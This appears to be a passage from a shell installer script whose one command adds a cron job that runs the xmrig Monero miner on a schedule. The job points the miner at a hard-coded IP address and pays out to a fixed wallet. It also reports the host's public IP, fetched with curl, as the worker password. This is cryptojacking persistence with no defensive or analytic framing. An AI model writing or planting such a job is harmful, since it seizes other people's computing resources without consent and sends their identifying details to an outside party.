...
# Schedule cron job
(crontab -l 2>/dev/null; echo "0 4-10 * * * /usr/local/bin/xmrig --url=38.47.101.33:443 --donate-level=0 --user=43p8AgGKbhH198j4aTvwMb42PwT6Mc1qzYm7Bxg4y4DTESJtGAvzgGePtwqudFmz7RCi29fwkuG4ZLgxmmQzN8joADCEv9S --pass=\$(curl 4.ipw.cn)-Auto -k --coin monero --tls") | crontab -
